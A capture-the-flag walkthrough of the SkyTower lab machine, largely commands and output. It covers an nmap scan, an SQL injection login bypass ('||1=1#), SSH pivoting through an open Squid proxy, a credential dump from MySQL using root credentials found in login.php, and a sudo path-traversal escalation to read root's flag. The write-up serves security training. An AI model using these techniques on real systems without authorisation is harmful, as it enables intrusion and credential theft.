root@kali ~# nmap -sS -A -T4 -p- 10.0.0.32

PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh                                                                                     
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))                                               
|_http-title: Site doesn't have a title (text/html).                                                      
|_http-server-header: Apache/2.2.22 (Debian)                                                              
3128/tcp open     http-proxy Squid http proxy 3.1.20                                                      
|_http-title: ERROR: The requested URL could not be retrieved                                             
| http-open-proxy: Potentially OPEN proxy.                                                                
|_Methods supported: GET HEAD                                                                             
|_http-server-header: squid/3.1.20 

After performing a nmap scan we see we have 2 open services and one filtered.
My guess is we are going to get credintails from the site on HTTP and redirect our login to ssh from the proxyserver.

root@kali ~/D/C/SkyTower [255]# dirsearch -u http://10.0.0.32

Brute forcing the directories didn't anything. Going to http://10.0.0.32 we need to login with an email and password. There are no comments we can find with dev tools. Maybe a sql injection works? Entering ' in the login iformation we have a sql syntax error.
Trying 'or 1=1# doesn't seem to work, by what the error displayed seems that "or" is being ignored, let's try using "||" instead of "or"

sql injection ---> '||1=1# 

And it works, we have the credintals for the user "john"

john:hereisjohn

Now we can connet via ssh. Since ssh is filtered (Filtered means that a firewall, filter, or other network obstacle is blocking the port) only the proxy server is allowed login access to the machine, so let's use proxychains and the proxy to our list.
Going to /etc/proxychains.conf we can add "http 10.0.0.32 3128" to our proxy list.

root@kali ~/D/C/SkyTower# proxychains ssh john@10.0.0.32
[proxychains] Dynamic chain  ...  10.0.0.32:3128  ...  10.0.0.32:22  ...  OK
john@10.0.0.32's password: 

After entering the password the connection is closed and we are logged out, we can try opening a new shell once we are logged in.

root@kali ~/D/C/SkyTower# proxychains ssh john@10.0.0.32 /bin/sh
[proxychains] Dynamic chain  ...  10.0.0.32:3128  ...  10.0.0.32:22  ...  OK
john@10.0.0.32's password: 
whoami
john

I searched on google and found that the .bashrc and .bash_logout files are responsible for actions on login, so we can delete them and see if we can login noramally.

root@kali ~/D/C/SkyTower# proxychains ssh john@10.0.0.32 rm .bashrc .bash_logout

root@kali ~/D/C/SkyTower [1]# proxychains ssh john@10.0.0.32 
[proxychains] Dynamic chain  ...  10.0.0.32:3128  ...  10.0.0.32:22  ...  OK
john@10.0.0.32's password: 

john@SkyTower:~$ 

Reading the /etc/passwd file we find 2 more users on the machine.

root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:john,,,:/home/john:/bin/bash
sara:x:1001:1001:,,,:/home/sara:/bin/bash
william:x:1002:1002:,,,:/home/william:/bin/bash

I used "sudo -l" to see if we have any sudo permissions but we don't, there are also no SUID files we can exploit.
Let's try enumerating mysql.

john@SkyTower:/home$ mysql
ERROR 1045 (28000): Access denied for user 'john'@'localhost' (using password: NO)

Going to /var/www we can read the login.php page and find these creditenls:

$db = new mysqli('localhost', 'root', 'root', 'SkyTech');

john@SkyTower:~$ mysql -u root -p
Enter password: 
mysql> 

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| SkyTech            |
| mysql              |
| performance_schema |
+--------------------+

mysql> use SkyTech
Database changed

mysql> show tables;
+-------------------+
| Tables_in_SkyTech |
+-------------------+
| login             |
+-------------------+

mysql> select * from login;
+----+---------------------+--------------+
| id | email               | password     |
+----+---------------------+--------------+
|  1 | john@skytech.com    | hereisjohn   |
|  2 | sara@skytech.com    | ihatethisjob |
|  3 | william@skytech.com | senseable    |
+----+---------------------+--------------+

Swithicing to the sara user and looking at our sudo permissions.

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*

We can use the "cat" and "ls" command as root only from the /accounts directory.

sara@SkyTower:~$ sudo ls /accounts/../root
[sudo] password for sara:
flag.txt

sara@SkyTower:~$ sudo cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower

Nice! we now have found the flag.txt and the password for the root user, we can now switch to the root user to finish the machine.

